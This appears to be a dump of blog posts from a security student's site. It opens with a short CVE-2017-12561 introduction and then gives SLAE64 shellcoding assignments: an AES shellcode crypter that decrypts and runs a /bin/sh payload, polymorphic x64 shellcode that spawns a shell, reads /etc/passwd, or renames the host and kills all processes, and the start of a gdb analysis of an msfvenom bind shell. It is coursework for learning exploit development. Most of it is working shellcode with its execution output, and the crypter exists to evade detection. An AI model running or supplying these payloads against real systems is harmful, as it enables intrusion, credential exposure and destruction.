[{"content":"Introduction The present document analyzes previous disclosed use-after-free in Hewlett Packard Enterprise Intelligent Management Center, a network management platform. The vulnerability was reported by Steven Seeley to the Zero Day Initiative (ZDI) disclosure program identified as CVE-2017-12561.\nThe flaw allows to perform an unauthenticated remote attack and execute arbitrary code on vulnerable installations.HP fixed this vulnerability in October 2017, and all vulnerable instances should be updated to version HPE Intelligent Management Center (iMC) iMC Plat 7.3 E0504P4 or earlier to avoid being exposed according to the released security security bulletin.\nBackground Before going deep into the details, one must be aware of some technical topics, namely the target installation environment and an overview of ASN.1 BER Encoding as the packets to communicate with the server are in this format.\n","permalink":"https://0xnibbles.github.io/posts/nday/zdi-17-836/","summary":"Introduction The present document analyzes previous disclosed use-after-free in Hewlett Packard Enterprise Intelligent Management Center, a network management platform. The vulnerability was reported by Steven Seeley to the Zero Day Initiative (ZDI) disclosure program identified as CVE-2017-12561.\nThe flaw allows to perform an unauthenticated remote attack and execute arbitrary code on vulnerable installations.HP fixed this vulnerability in October 2017, and all vulnerable instances should be updated to version HPE Intelligent Management Center (iMC) iMC Plat 7.","title":"ZDI-17-836 - dbman Opcode 10012 Use-After-Free Remote Code Execution"},{"content":" This post introduces the 7th and last mission of my SLAE64 journey.\nAs well as the SLAE32 - Custom Crypter decided to work with python3 and the majority of the work was dealing with conversion types between encrypting and decrypting the shellcode.\nIntroduction The SLAE32 7th assignment purpose is to create a custom crypter having as reference the one shown in the crypter lesson..\nFor this task there are no special requirements:\nCan use any existing encryption schema Can use any programming language I decided to to have a simpler approach to this task and as well other previous assignments I tried to port the 32bit version to 64bit.\nThere is a lof of overlap information with my post regarding the SLAE32 - Custom Crypter if you are interested in compare the between the ISAs.\nCrypter For the encryption scheme, the choice was AES in CTR mode. I used the script made for the custom encoder/decoder assignment as a reference.\nFor the shellcode I used the execve stack shellcode\n\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80 Let\u0026rsquo;s see the crypter script.\n#!/usr/bin/python3 # AES CTR-mode shellcode crypter import argparse import secrets import sys import string import pyaes import binascii import os secretsGenerator = secrets.SystemRandom() c_style_shellcode = (b\u0026#34;\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05\u0026#34;) # bin/sh shellcode = \u0026#34;\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05\u0026#34; encrypted_shellcode = \u0026#34;\\x97\\x90\\xe1\\x60\\x56\\x70\\xfc\\x91\\x60\\x01\\xa2\\xcf\\x29\\x43\\x67\\x15\\x9f\\x73\\x72\\x9b\\xff\\x25\\xb8\\xfa\\xe9\\xc8\\xa6\\x3f\\xe8\\x0d\\x9e\\xa9\u0026#34; # encrypted shellcode iv =86225370279291231266238124133917033753321926857843067389263155507994576978348 def banner(): print(\u0026#39;\u0026#39;\u0026#39; ________________________________________________________ \u0026lt;The \u0026#34;AEShellCrypter\u0026#34; - Encrypt your shellcode with AES \u0026gt; -------------------------------------------------------- \\ ^__^ \\ (oo)\\_______ (__)\\ )\\/\\\\ ||----w | || || \u0026#39;\u0026#39;\u0026#39;) #---------------------------- class Crypter: def randomKeyGenerator(self): alphabet = string.ascii_letters + string.digits + string.punctuation key = \u0026#39;\u0026#39;.join(secrets.choice(alphabet) for i in range(16)) return str.encode(key) def __init__(self,key=None): if key is not None: self.key = str.encode(key) print(\u0026#34;[*] Key Provided. Doing magic with it\u0026#34;) else: self.key = self.randomKeyGenerator() print(\u0026#34;[*] Doing magic with a (pseudo) Random key\u0026#34;) print(\u0026#34;[*] Key: \u0026#34;+self.key.decode()) def encrypt(self, shellcode): #iv = secrets.randbits(256) # for random IV aes = pyaes.AESModeOfOperationCTR(self.key, pyaes.Counter(iv)) crypted_shellcode = aes.encrypt(shellcode) print(\u0026#34;IV: \u0026#34;+str(iv)) #print(\u0026#39;Encrypted:\u0026#39;, crypted_shellcode) final_shellcode = \u0026#34;\u0026#34; for crypted_shellbyte in bytearray(crypted_shellcode): final_shellcode += \u0026#39;\\\\x\u0026#39; + \u0026#39;%02x\u0026#39; % crypted_shellbyte # \\x format # print encrypted shellcode in c-style format print() print(final_shellcode) def decrypt(self, final_shellcode): print(\u0026#34;Decrypted\u0026#34;) final_shellcode = bytes(final_shellcode, encoding=\u0026#34;raw_unicode_escape\u0026#34;) aes = pyaes.AESModeOfOperationCTR(self.key, pyaes.Counter(iv)) decrypted_shellcode = aes.decrypt(final_shellcode) original_shellcode = \u0026#34;\u0026#34; for shellbyte in bytearray(decrypted_shellcode): original_shellcode += \u0026#39;\\\\x\u0026#39; + \u0026#39;%02x\u0026#39; % shellbyte # \\x format return original_shellcode #print(binascii.hexlify(bytearray(final_shellcode.replace(\u0026#34;\\\\x\u0026#34;,\u0026#34;\u0026#34;).encode()))) def executeShellcode(original_shellcode): file = open(\u0026#34;shellcode.c\u0026#34;, \u0026#34;w\u0026#34;) file.write(\u0026#39;\u0026#39;\u0026#39; #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\\u0026#34;\u0026#39;\u0026#39;\u0026#39; + original_shellcode + \u0026#39;\u0026#39;\u0026#39;\u0026#34;; void main() { printf(\\\u0026#34;Shellcode Length: %d\\\\n\\\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); }\u0026#39;\u0026#39;\u0026#39; ) file.close() os.system(\u0026#34;gcc -fno-stack-protector -z execstack -m64 shellcode.c -o shellcode 2\u0026gt;/dev/null\u0026#34;) os.system(\u0026#34;./shellcode\u0026#34;) def main(): #shellcode = bytearray(c_style_shellcode) #print(\u0026#34;[*] Shellcode length: \u0026#34;+str(len(shellcode))+\u0026#34;\\n\u0026#34;) #print(\u0026#34;[*] Shellcode: \u0026#34;+str(c_style_shellcode)+\u0026#34;\\n\u0026#34;) print(\u0026#34;[*] Encrypted Shellcode length: \u0026#34;+str(len(shellcode))+\u0026#34;\\n\u0026#34;) print(\u0026#34;[*] Encrypted Shellcode: \u0026#34;+str(c_style_shellcode)+\u0026#34;\\n\u0026#34;) # dor dynamic c-style use bytes(final_shellcode, encoding=\u0026#34;raw_unicode_escape\u0026#34;) # -------------------KEY-------------- key = \u0026#34;B6*D+/5DQ$MFn\u0026lt;T{\u0026#34; # example key #key = None ##################################### crypter = Crypter(key); crypter.encrypt(shellcode) original_shellcode = crypter.decrypt(encrypted_shellcode) executeShellcode(original_shellcode) if __name__ == \u0026#39;__main__\u0026#39;: banner() # displays the program banner main() print(\u0026#34;\\n--------------------\u0026#34;) print(\u0026#34;[*] Hack the World!\u0026#34;) print(\u0026#34;--------------------\u0026#34;) print() print() For AES CTR mode, we need to pay attention to the iv and key of the encryption process because they are a must for the decryption process.\nBasically, this encryption does the following:\naccepts shellcode in \\x format - shellcode variable; generates a pseudorandom key and iv or uses one provided by the user - key and iv variables; prints the shellcode in \\x format All this process is manual by the time of writing this post. The shellcode, iv, and encrypted shellcode are hardcoded.\nFor the decryption process:\nJust prepared the encrypted shellcode (encrypted_shellcode variable) for decryption as it receives a bytes object; Use the encryption iv and key to decrypt the shellcode; Then, appends the decrypted shellcode to a shellcode.c program, compiles it with gcc, and executes it.\nExecuting the python Crypter:\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/7-Custom-crypter ‹main●› ╰─$ python3 aesCrypter.py ________________________________________________________ \u0026lt;The \u0026#34;AEShellCrypter\u0026#34; - Encrypt your shellcode with AES \u0026gt; -------------------------------------------------------- \\ ^__^ \\ (oo)\\_______ (__)\\ )\\/\\ ||----w | || || [*] Encrypted Shellcode length: 32 [*] Encrypted Shellcode: b\u0026#39;H1\\xc0PH\\xbb/bin//shSH\\x89\\xe7PH\\x89\\xe2WH\\x89\\xe6H\\x83\\xc0;\\x0f\\x05\u0026#39; [*] Key Provided. Doing magic with it [*] Key: B6*D+/5DQ$MFn\u0026lt;T{ IV: 86225370279291231266238124133917033753321926857843067389263155507994576978348 \\x97\\x90\\xe1\\x60\\x56\\x70\\xfc\\x91\\x60\\x01\\xa2\\xcf\\x29\\x43\\x67\\x15\\x9f\\x73\\x72\\x9b\\xff\\x25\\xb8\\xfa\\xe9\\xc8\\xa6\\x3f\\xe8\\x0d\\x9e\\xa9 Decrypted Shellcode Length: 32 $ -------------------- [*] Hack the World! -------------------- Improving this script is a future work to be performed. Working with different types in Python is a time-consuming task and requires some ability to handle it.\nThis blog post has been created for completing the requirements of the x86_64 Assembly Language and Shellcoding on Linux (SLAE64): https://www.pentesteracademy.com/course?id=7\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86_64\n","permalink":"https://0xnibbles.github.io/posts/slae64/slae_64_assignment_7/","summary":"This post introduces the 7th and last mission of my SLAE64 journey.\nAs well as the SLAE32 - Custom Crypter decided to work with python3 and the majority of the work was dealing with conversion types between encrypting and decrypting the shellcode.\nIntroduction The SLAE32 7th assignment purpose is to create a custom crypter having as reference the one shown in the crypter lesson..\nFor this task there are no special requirements:","title":"SLAE64 Assignment 7 - Custom Crypter"},{"content":" This post introduces my 6th mission to my SLAE64 journey.\nSome existing tools, such as ADMutate, will XOR-encrypt existing shellcode and attach loader code. This is useful, but writing polymorphic shellcodes without a tool is a much better learning experience.\nThere is a lot of overlap information with my post regarding the SLAE32 - Polymorphic Shellcode. I advise you to look at it if you haven’t done it already. There are some essential concepts and ideas to understand what and why the shellcode is doing.\nIntroduction The SLAE32 6th assignment task is to select three shellcode payloads from the shell-storm and create polymorphic versions of them without increasing the size of the shellcode by more than 50%;\nBonus points if we can make it shorter in length compared to the original.\nShellcode 1 - execve(/bin/sh, [/bin/sh], NULL) \u0026ndash;\nThis shellcode was written by hophet, and is located here. This shellcode calls execve sycall and executes /bin/sh.\nSize: 41 bytes\nThe original shellcode is in AT\u0026amp;T syntax but I\u0026rsquo;ll show in Intel syntax as it more intuite for me.\n; [Linux/X86-64] ; Dummy for shellcode: ; execve(\u0026#34;/bin/sh\u0026#34;, [\u0026#34;/bin/sh\u0026#34;], NULL) ; hophet [at] gmail.com _start: xor rdx, rdx mov rbx, 0x68732f6e69622fff shr rbx, 0x8 push rbx mov rdi, rsp xor rax, rax push rax push rdi mov rsi, rsp mov al, 0x3b ; execve(3b) syscall push 0x1 pop rdi push 0x3c ; exit(3c) pop rax syscall Let\u0026rsquo;s see what we can do here.\nPolymorphic Version _start: xor rsi, rsi mul rsi mov r9, 0x68732f6e69622fff shr r9, 0x8 mov [rsp-0x8], r9 lea rdi, [rsp-8] add al, 0x3b ; execve(3b) syscall push 0x1 pop rdi push 0x3c ; exit(3c) pop rax syscall Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/execve_bin_sh-76 ‹main●› ╰─$ ../../../assembler.sh poly_execve.nasm [*] Compiling with NASM [*] Linking ld: warning: cannot find entry symbol _start; defaulting to 0000000000401000 [*] Extracting opcodes [*] Done Shellcode size: 42 \u0026#34;\\x48\\x31\\xf6\\x48\\xf7\\xe6\\x49\\xb9\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe9\\x08\\x4c\\x89\\x4c\\x24\\xf8\\x48\\x8d\\x7c\\x24\\xf8\\xb0\\x3b\\x0f\\x05\\x6a\\x01\\x5f\\x6a\\x3c\\x58\\x0f\\x05\u0026#34; -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\x48\\x31\\xf6\\x48\\xf7\\xe6\\x49\\xb9\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe9\\x08\\x4c\\x89\\x4c\\x24\\xf8\\x48\\x8d\\x7c\\x24\\xf8\\xb0\\x3b\\x0f\\x05\\x6a\\x01\\x5f\\x6a\\x3c\\x58\\x0f\\x05\u0026#34;; main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/execve_bin_sh-76 ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/execve_bin_sh-76 ‹main●› ╰─$ ./shellcode Shellcode Length: 42 $ whoami edu $ Size: 42 bytes\nIncreased 1 byte which is more 2,4% in size compared to the original.\nShellcode 2 - Read /etc/passwd This shellcode was written by Mr.Un1k0d3r, and is located here. This shellcode reads the /etc/passwd file to stdout.\nSize: 82 bytes\nBITS 64 ; Author Mr.Un1k0d3r - RingZer0 Team ; Read /etc/passwd Linux x86_64 Shellcode ; Shellcode size 82 bytes global _start section .text _start: jmp _push_filename _readfile: ; syscall open file pop rdi ; pop path value ; NULL byte fix xor byte [rdi + 11], 0x41 xor rax, rax add al, 2 xor rsi, rsi ; set O_RDONLY flag syscall ; syscall read file sub sp, 0xfff lea rsi, [rsp] mov rdi, rax xor rdx, rdx mov dx, 0xfff; size to read xor rax, rax syscall ; syscall write to stdout xor rdi, rdi add dil, 1 ; set stdout fd = 1 mov rdx, rax xor rax, rax add al, 1 syscall ; syscall exit xor rax, rax add al, 60 syscall _push_filename: call _readfile path: db \u0026#34;/etc/passwdA\u0026#34; The shellcode has some tricks to use less space, but we can be even more “space friendly.” In the comments, we have the changed instructions below their polymorphic version.\nPolymorphic Version jmp _readfile path: db 0x2f,0x65,0x74,0x63,0x2f,0x70,0x61,0x73,0x73,0x77,0x64 _readfile: ; syscall open file ;pop rdi ; pop path value lea rdi, [rel path] ; NULL byte fix ;xor byte [rdi + 11], 0x41 shr byte [rdi+11], 8 ;xor rax, rax ;add al, 2 push byte 0x2 pop rax xor rsi, rsi ; set O_RDONLY flag syscall ; syscall read file sub sp, 0xfff lea rsi, [rsp] mov rdi, rax xor rax, rax cdq mov dx, 0xfff; size to read syscall ; syscall write to stdout push byte 0x1 ; set stdout fd = 1 pop rdi mov rdx, rax push byte 0x1 pop rax syscall ; syscall exit push byte 60 pop rax syscall Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/read_etc_passwd-878 ‹main●› ╰─$ ../../../assembler.sh poly_read_passwd.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 70 \u0026#34;\\xeb\\x0b\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x48\\x8d\\x3d\\xee\\xff\\xff\\xff\\xc0\\x6f\\x0b\\x08\\x6a\\x02\\x58\\x48\\x31\\xf6\\x0f\\x05\\x66\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xc0\\x99\\x66\\xba\\xff\\x0f\\x0f\\x05\\x6a\\x01\\x5f\\x48\\x89\\xc2\\x6a\\x01\\x58\\x0f\\x05\\x6a\\x3c\\x58\\x0f\\x05\u0026#34; -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\xeb\\x0b\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x48\\x8d\\x3d\\xee\\xff\\xff\\xff\\xc0\\x6f\\x0b\\x08\\x6a\\x02\\x58\\x48\\x31\\xf6\\x0f\\x05\\x66\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xc0\\x99\\x66\\xba\\xff\\x0f\\x0f\\x05\\x6a\\x01\\x5f\\x48\\x89\\xc2\\x6a\\x01\\x58\\x0f\\x05\\x6a\\x3c\\x58\\x0f\\x05\u0026#34;; main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/read_etc_passwd-878 ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/read_etc_passwd-878 ‹main●› ╰─$ ./shellcode Shellcode Length: 70 root:x:0:0:root:/root:/usr/bin/zsh daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin dnsmasq:x:105:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:107:113:RealtimeKit,,,:/proc:/usr/sbin/nologin pulse:x:108:117:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin speech-dispatcher:x:109:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false avahi:x:110:119:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:111:120::/var/lib/saned:/usr/sbin/nologin colord:x:112:121:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false lightdm:x:114:122:Light Display Manager:/var/lib/lightdm:/bin/false systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin edu:x:1000:1000:edu:/home/edu:/usr/bin/zsh Size: 70 bytes\nReduced 12 bytes!!! This is a reduction of 14,6% in size compared to the original.\nI\u0026rsquo;ve made the same exercise for the 32bit version but I only could increase the code size. Having in the 64bit version less 14,6% is a real great achievement for me.\nShellcode 3 - setHostname() \u0026amp; killall This shellcode was written by zbt, and is located here. This shellcode sets the hostname to \u0026ldquo;Rooted !\u0026rdquo; and kills all the processes.\nSize: 33 bytes\n; sethostname(\u0026#34;Rooted !\u0026#34;); ; kill(-1, SIGKILL); section .text global _start _start: ;-- setHostName(\u0026#34;Rooted !\u0026#34;); 22 bytes --; mov al, 0xaa mov r8, \u0026#39;Rooted !\u0026#39; push r8 mov rdi, rsp mov sil, 0x8 syscall ;-- kill(-1, SIGKILL); 11 bytes --; push byte 0x3e pop rax push byte 0xff pop rdi push byte 0x9 pop rsi syscall Simple short shellcode without many room for improvements.\nPolymorphic Version ; sethostname(\u0026#34;Rooted !\u0026#34;); ; kill(-1, SIGKILL); section .text global _start _start: ;-- setHostName(\u0026#34;Rooted !\u0026#34;); 22 bytes --; sethostname: xor rax, rax\t; zeroing out rax xor rsi, rsi add\tal, 0xaa mov\tr9, 0x21206465746F6F52\t; Rooted ! push r9\tmov rdi, rsp\tadd sil, 0x8\t; and subing it down to 0x08 syscall ;-- kill(-1, SIGKILL); 11 bytes --; xor rax, rax add al, 0x3e mov rdi, rax sub rdi, 0x3f inc rsi syscall Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/setHostname_killall-605 ‹main●› ╰─$ ../../../assembler.sh poly_setHostaname_killall.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 46 \u0026#34;\\x48\\x31\\xc0\\x48\\x31\\xf6\\x04\\xaa\\x49\\xb9\\x52\\x6f\\x6f\\x74\\x65\\x64\\x20\\x21\\x41\\x51\\x48\\x89\\xe7\\x40\\x80\\xc6\\x08\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3e\\x48\\x89\\xc7\\x48\\x83\\xef\\x3f\\x48\\xff\\xc6\\x0f\\x05\u0026#34; -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\x48\\x31\\xc0\\x48\\x31\\xf6\\x04\\xaa\\x49\\xb9\\x52\\x6f\\x6f\\x74\\x65\\x64\\x20\\x21\\x41\\x51\\x48\\x89\\xe7\\x40\\x80\\xc6\\x08\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3e\\x48\\x89\\xc7\\x48\\x83\\xef\\x3f\\x48\\xff\\xc6\\x0f\\x05\u0026#34;; main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/setHostname_killall-605 ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c shellcode.c:8:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86_64/assignments/6-Polymorphic-Shellcode/read_etc_passwd-878 ‹main●› ╰─$ ./shellcode Shellcode Length: 70 root:x:0:0:root:/root:/usr/bin/zsh daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin After executing the shellcode, we get logged out of the session, and the hostname is changed.\nSize: 46 bytes\nIncreased 39,4%, which reflects the additional 13 bytes.\nThis blog post has been created for completing the requirements of the x86_64 Assembly Language and Shellcoding on Linux (SLAE64): https://www.pentesteracademy.com/course?id=7\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86_64\n","permalink":"https://0xnibbles.github.io/posts/slae64/slae_64_assignment_6/","summary":"This post introduces my 6th mission to my SLAE64 journey.\nSome existing tools, such as ADMutate, will XOR-encrypt existing shellcode and attach loader code. This is useful, but writing polymorphic shellcodes without a tool is a much better learning experience.\nThere is a lot of overlap information with my post regarding the SLAE32 - Polymorphic Shellcode. I advise you to look at it if you haven’t done it already. There are some essential concepts and ideas to understand what and why the shellcode is doing.","title":"SLAE64 Assignment 6 - Polymorphic Shellcode"},{"content":" This post introduces my 5th mission of my SLAE64 journey.\nIntroduction The SLAE64 5th assignment\u0026rsquo;s purpose is to select three msfvenom payloads, dissect them with gdb, and document my analysis.\nFor this task, I selected the following payloads:\nlinux/x86/shell_bind_tcp linux/x86/shell_reverse_tcp linux/x86/chmod Shellcode 1 - linux/x64/shell_bind_tcp The first step to do is to generate the shellcode using MSF. As usual, let’s check its arguments.\nmsfvenom -p linux/x64/shell_bind_tcp --list-options\n-[~]$ msfvenom -p linux/x64/shell_bind_tcp --list-options Options for payload/linux/x64/shell_bind_tcp: ========================= Name: Linux Command Shell, Bind TCP Inline Module: payload/linux/x64/shell_bind_tcp Platform: Linux Arch: x64 Needs Admin: No Total size: 86 Rank: Normal Provided by: ricky Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- LPORT 4444 yes The listen port RHOST no The target address Description: Listen for a connection and spawn a command shell Let\u0026rsquo;s get our bind shell using msfvenom. The command below will by default point to 127.0.0.1 and port 4444.\n[~]$ msfvenom -p linux/x64/shell_bind_tcp -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 86 bytes Final size of c file: 389 bytes unsigned char buf[] = \u0026#34;\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\u0026#34; \u0026#34;\\x52\\xc7\\x04\\x24\\x02\\x00\\x11\\x5c\\x48\\x89\\xe6\\x6a\\x10\\x5a\u0026#34; \u0026#34;\\x6a\\x31\\x58\\x0f\\x05\\x6a\\x32\\x58\\x0f\\x05\\x48\\x31\\xf6\\x6a\u0026#34; \u0026#34;\\x2b\\x58\\x0f\\x05\\x48\\x97\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\u0026#34; \u0026#34;\\x58\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\u0026#34; \u0026#34;\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\u0026#34; \u0026#34;\\x0f\\x05\u0026#34;; Compile and Testing the Shellcode Adding the shellcode to our tester program - shellcode.c\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \u0026#34;\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\u0026#34; \u0026#34;\\x52\\xc7\\x04\\x24\\x02\\x00\\x11\\x5c\\x48\\x89\\xe6\\x6a\\x10\\x5a\u0026#34; \u0026#34;\\x6a\\x31\\x58\\x0f\\x05\\x6a\\x32\\x58\\x0f\\x05\\x48\\x31\\xf6\\x6a\u0026#34; \u0026#34;\\x2b\\x58\\x0f\\x05\\x48\\x97\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\u0026#34; \u0026#34;\\x58\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\u0026#34; \u0026#34;\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\u0026#34; \u0026#34;\\x0f\\x05\u0026#34;; int main() { int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it.\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/shell_bind-tcp ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c ╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/shell_bind-tcp ‹main●› ╰─$ ./shellcode ---------------- ╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› ╰─$ nc -nv 127.0.0.1 4444 (UNKNOWN) [127.0.0.1] 4444 (?) open id uid=1000(edu) gid=1000(edu) GDB Analysis For this analysis I used GEF plugin to assist my analysis with GDB.\ngdb -q ./shellcode First, we put a breakpoint in code[] to pause the execution at the beginning of the shellcode.\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/5-MSF-Shellcode-Analysis/shell_bind-tcp ‹main●› ╰─$ gdb -q ./shellcode GEF for linux ready, type `gef\u0026#39; to start, `gef config\u0026#39; to configure 77 commands loaded for GDB 8.2.1 using Python engine 3.7 gef➤ b *\u0026amp;code Breakpoint 1 at 0x4040 gef➤ r We go direct to the shellcode\u0026rsquo;s first instruction.\nDisassembling Bind TCP Shellcode With the instruction disas we can disassemble the code function. In our context is the Bind Shellcode.\ngef➤ disas Dump of assembler code for function code: =\u0026gt; 0x0000555555558040 \u0026lt;+0\u0026gt;: push 0x29 0x0000555555558042 \u0026lt;+2\u0026gt;: pop rax 0x0000555555558043 \u0026lt;+3\u0026gt;: cdq 0x0000555555558044 \u0026lt;+4\u0026gt;: push 0x2 0x0000555555558046 \u0026lt;+6\u0026gt;: pop rdi 0x0000555555558047 \u0026lt;+7\u0026gt;: push 0x1 0x0000555555558049 \u0026lt;+9\u0026gt;: pop rsi 0x000055555555804a \u0026lt;+10\u0026gt;: syscall 0x000055555555804c \u0026lt;+12\u0026gt;: xchg rdi,rax 0x000055555555804e \u0026lt;+14\u0026gt;: push rdx 0x000055555555804f \u0026lt;+15\u0026gt;: mov DWORD PTR [rsp],0x5c110002 0x0000555555558056 \u0026lt;+22\u0026gt;: mov rsi,rsp 0x0000555555558059 \u0026lt;+25\u0026gt;: push 0x10 0x000055555555805b \u0026lt;+27\u0026gt;: pop rdx 0x000055555555805c \u0026lt;+28\u0026gt;: push 0x31 0x000055555555805e \u0026lt;+30\u0026gt;: pop rax 0x000055555555805f \u0026lt;+31\u0026gt;: syscall 0x0000555555558061 \u0026lt;+33\u0026gt;: push 0x32 